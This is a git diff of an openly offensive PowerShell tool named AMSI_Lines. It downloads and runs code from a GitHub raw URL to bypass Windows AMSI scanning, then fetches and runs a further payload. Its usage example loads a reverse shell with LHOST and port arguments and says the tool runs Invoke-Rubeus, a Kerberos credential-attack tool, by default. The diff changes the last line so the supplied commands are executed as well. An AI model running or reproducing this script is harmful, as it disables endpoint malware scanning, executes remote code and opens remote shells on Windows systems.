@@ -4,14 +4,11 @@
     
 .NOTES  
     Function   : AMSI_Bypass
-    File Name  : FodhelperBypass.ps1
+    File Name  : AMSI.ps1
 .EXAMPLE  
-     Load "cmd.exe /c powershell.exe" (it's default):
-     FodhelperBypass 
-     Load specific application:
-     FodhelperBypass -program "cmd.exe"
-     FodhelperBypass -program "cmd.exe /c powershell.exe"
-     
+     import-module AMSI.ps1
+     AMSI_Lines -File http://127.0.0.1:8080/revshell.ps1 -Commands "-LHOST MyIp -Port 9001"
+     AMSI_Lines # This Will Execute Invoke-Rubeus By default with '-h' parameter
 #>
 function AMSI_Lines(){ 
  Param (
@@ -50,7 +47,7 @@ sleep 2
 iex ( iwr https://raw.githubusercontent.com/x4sh3s/AMSI_Lines/main/11.txt -UseBasicParsing )
 
 sleep 2
-iex ( iwr $File -UseBasicParsing) ; $Commands
+iex ( iwr $File -UseBasicParsing) ; iex $Commands
 }
 
 AMSI_Lines()
